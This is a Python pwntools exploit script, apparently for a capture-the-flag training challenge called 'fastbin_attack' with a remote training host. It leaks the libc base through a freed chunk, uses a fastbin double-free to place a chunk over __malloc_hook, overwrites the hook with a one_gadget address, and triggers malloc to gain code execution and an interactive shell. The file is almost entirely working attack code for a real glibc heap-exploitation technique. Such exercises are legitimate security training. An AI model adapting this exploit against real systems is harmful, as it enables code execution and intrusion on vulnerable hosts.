from pwn import *
import time
import subprocess
from functools import reduce


def send(r, data):
	r.send(data)
	time.sleep(0.2)

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

def rop_chain(chain):     
    for i in range(len(chain)):
        chain[i] = p64(chain[i])
    return reduce(lambda x, y: x + y, chain)

#I/O functions
#All I/O functions assume they havebeen called from the main menu
# Given a size allocates the entry in heap and returns its index
def alloc(r, size):
    r.clean()
    send(r, b"1")
    r.recvuntil(b"Size: ")
    send(r, str(size).encode())
    r.recvuntil(b"Allocated at index ")
    return int(r.recvnS(1))

def write(r, index, data):
    r.clean()
    send(r, b"2")
    r.recvuntil(b"Index: ")
    send(r, str(index).encode())
    r.recvuntil(b"Content: ")
    send(r, data)
    r.recvuntil(b"Done!")

def read(r, index):
    r.clean()
    send(r, b"3")
    r.recvuntil(b"Index: ")
    send(r, str(index).encode())
    return r.recvline(keepends=False)

def free(r, index):
    r.clean()
    send(r, b"4")
    r.recvuntil(b"Index: ")
    send(r, str(index).encode())
    r.recvuntil(b"Index")

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "warn"
logging.getLogger('pwnlib.elf').setLevel(logging.ERROR)

# breakpoints
b_main = 0xffff

one_gadget=0x00
if args["ONE_GADGET"]:
    one_gadget = int(args["ONE_GADGET"], 16)

if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 10101)
else:
    r = process("./fastbin_attack")
    if args["GDB"]:
        gdb.attach(r, f"""
        unset env
        set disable-randomization off
        set debuginfod enabled on
        c
        """)
        input("wait")

LIBC = ELF("./libc-2.23.so")


#LIBC LEAK
small = alloc(r, 0x100)
pad = alloc(r, 0x20)
free(r, small)
libc_leak = u64(read(r, small).ljust(8, b"\x00"))
LIBC.address = libc_leak - 0x3c4b78
print("libc_base:", hex(LIBC.address))

#FASTBIN ATTACK
a = alloc(r, 0x60)
b = alloc(r, 0x60)
free(r, a)
free(r, b)
free(r, a)
a = alloc(r, 0x60)
write(r, a, p64(LIBC.symbols["__malloc_hook"] - 0x23))
b = alloc(r, 0x60)
a = alloc(r, 0x60)

#RCE
hook = alloc(r, 0x60)
write(r, hook, b'a'*0x13+p64(LIBC.address+one_gadget))
r.clean() #performing another malloc will trigger __malloc_hook and get RCE
send(r, b"1")
r.recvuntil(b"Size: ")
send(r, b"30")

r.interactive()
